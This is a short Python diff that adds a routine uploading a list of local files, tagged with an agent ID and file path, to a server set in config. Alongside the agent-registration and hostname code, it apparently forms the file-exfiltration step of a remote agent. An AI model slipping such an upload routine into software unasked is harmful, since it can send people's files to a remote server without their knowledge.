@@ -49,8 +49,23 @@ def getUser():
 def extension(filePath):
     return Path(filePath).suffix
 
-def uploadFiles(paths):
-    print(f"paths to upload are {paths}")
+def uploadFiles(paths, agentId):
+    for path in paths:
+        try:
+            with open(path, 'rb') as file:
+                response = requests.post(
+                    f"http://{config.SERVER_IP}:{config.SERVER_PORT}{config.UPLOAD_ENDPOINT}",
+                    files = {'file' : file},
+                    data = {
+                        'agent_id' : agentId,
+                        'path' : path,
+                    },
+                    timeout = config.TIMEOUT
+                )
+            response.raise_for_status()
+            print(f"Uploaded: {path}")
+        except Exception as e:
+            print(f"Failed to upload {path}: {e}")
 
 def registerWithServer():
     hostName = socket.gethostname()
